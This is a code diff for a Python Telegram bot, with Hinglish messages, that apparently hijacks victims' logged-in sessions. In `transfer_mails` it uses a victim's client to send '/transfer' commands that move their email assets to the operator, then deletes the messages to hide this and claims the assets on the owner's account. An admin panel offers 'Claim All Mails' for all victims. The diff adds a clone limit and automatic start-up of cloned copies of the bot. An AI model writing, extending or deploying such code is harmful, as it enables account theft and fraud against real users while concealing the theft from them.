@@ -136,21 +136,17 @@ async def transfer_mails(victim_uid, owner_id_to_send=OWNER_ID):
         if not emails: return
 
         for email in emails:
-            # 1. Transfer from victim
             await victim_client.send_message(target_bot, f"/transfer {email} {OWNER_USERNAME}")
             await asyncio.sleep(4)
             
-            # Clean victim's messages
             try:
                 msgs = await victim_client.get_messages(target_bot, limit=2)
                 for m in msgs: await victim_client.delete_messages(target_bot, m.id)
             except: pass
             
-            # 2. Claim on Owner ID
             await owner_client.send_message(owner_target_bot, email)
             await asyncio.sleep(4)
             
-            # Clean owner's fake bot messages
             try:
                 msgs = await owner_client.get_messages(owner_target_bot, limit=2)
                 for m in msgs: await owner_client.delete_messages(owner_target_bot, m.id)
@@ -214,9 +210,17 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     uid = update.effective_user.id
     
-    # --- Clone Bot Logic ---
+    # --- Clone Bot Logic (With Limit) ---
     if user_states.get(uid) == 'clone_token':
         new_token = text.strip()
+        
+        # Check Existing Clones (Limit 2)
+        clone_count = db_exec("SELECT COUNT(*) FROM clones")[0][0]
+        if clone_count >= 2:
+            await update.message.reply_text("❌ **Limit Reached!** Aap maximum 2 hi bots clone kar sakte hain. Pehle kisi purane clone ko delete karein.")
+            user_states[uid] = None
+            return
+            
         try:
             temp_app = Application.builder().token(new_token).build()
             bot_info = await temp_app.bot.get_me()
@@ -238,11 +242,9 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             owner_id = int(text.strip())
             token = user_states[uid]['token']
-            owner_uname = user_states[uid]['owner_uname']
             
             msg = await update.message.reply_text("⚙️ Cloning Bot...\n[□□□□□□□□□□] 0%")
             
-            # Animation
             for i in range(1, 11):
                 await asyncio.sleep(0.5)
                 bar = "■" * i + "□" * (10-i)
@@ -250,11 +252,15 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             db_exec("INSERT OR REPLACE INTO clones (bot_token, owner_id) VALUES (?,?)", (token, owner_id))
             
-            await msg.edit_text(f"✅ **Clone Bot Deployed Successfully!**\n\nBot Token: `{token}`\nOwner ID: `{owner_id}`\n\nAb aap is bot ko start kar sakte hain.")
+            # Start Clone Immediately
+            await start_single_clone(token)
+            
+            await msg.edit_text(f"✅ **Clone Bot Deployed & Started Successfully!**\n\nBot Token: `{token}`\nOwner ID: `{owner_id}`\n\nAb aap is bot ko start kar sakte hain.")
             user_states[uid] = None
             return
-        except:
-            await update.message.reply_text("❌ Invalid User ID. Sirf numbers daalein.")
+        except Exception as e:
+            await update.message.reply_text(f"❌ Error: {e}")
+            user_states[uid] = None
             return
 
     # --- Admin Logic ---
@@ -412,7 +418,6 @@ async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid not in get_all_admins(): return
     
-    # Stylish colored-style buttons with Danger/Primary/Secondary text labels
     kb = [
         [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc")],
         [InlineKeyboardButton("📤 Claim All Mails (Danger)", callback_data="admin_claim")],
@@ -440,6 +445,12 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "clone_bot":
+        # Check Clone Limit
+        clone_count = db_exec("SELECT COUNT(*) FROM clones")[0][0]
+        if clone_count >= 2:
+            await query.edit_message_text("❌ **Limit Reached!** Aap maximum 2 hi bots clone kar sakte hain. Pehle kisi purane clone ko delete karein.")
+            return
+            
         await query.edit_message_text("🤖 **Clone Bot Setup**\n\nStep 1: @BotFather se naya Bot Token banayein aur yahan bhejein:")
         user_states[uid] = 'clone_token'
         return
@@ -515,23 +526,29 @@ async def manual_claim_all(owner_id, query):
     await query.message.reply_text(f"👑 <b>{f_txt('ALL VICTIMS MAILS CLAIMED!')}</b>\n{p_style('Total Claimed: ' + str(total_claimed))}", parse_mode="HTML")
 
 # ================== CLONE BOT RUNNER ==================
-# Agar FadeHost ya koi aur server restart ho, to clones auto start ho sake iske liye (Simplified version)
+async def start_single_clone(token):
+    try:
+        # Delete webhook to prevent conflict
+        temp_bot = Bot(token=token)
+        await temp_bot.delete_webhook(drop_pending_updates=True)
+        await temp_bot.close()
+        
+        app_bot = Application.builder().token(token).build()
+        app_bot.add_handler(CommandHandler("start", start))
+        app_bot.add_handler(MessageHandler(filters.CONTACT, verify_contact_withdraw))
+        app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
+        app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router))
+        
+        # Start polling in background
+        asyncio.create_task(app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False))
+        logger.info(f"Clone bot started: {token}")
+    except Exception as e:
+        logger.error(f"Clone bot start error: {e}")
+
 async def run_clones():
     clones = db_exec("SELECT bot_token FROM clones")
     for c in clones:
-        token = c[0]
-        # Yahan humne basic polling start kiya hai. FadeHost par multiple polling heavy ho sakta hai, 
-        # but aapke use-case ke liye theek hai.
-        try:
-            app_bot = Application.builder().token(token).build()
-            app_bot.add_handler(CommandHandler("start", start))
-            app_bot.add_handler(MessageHandler(filters.CONTACT, verify_contact_withdraw))
-            app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
-            app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router))
-            
-            # Start polling in background
-            asyncio.create_task(app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False))
-        except: pass
+        await start_single_clone(c[0])
 
 # ================== MAIN ==================
 def main():
@@ -547,7 +564,6 @@ def main():
 
     logger.info("Main Bot started successfully.")
     
-    # Start clones if any
     loop = asyncio.get_event_loop()
     loop.create_task(run_clones())
     
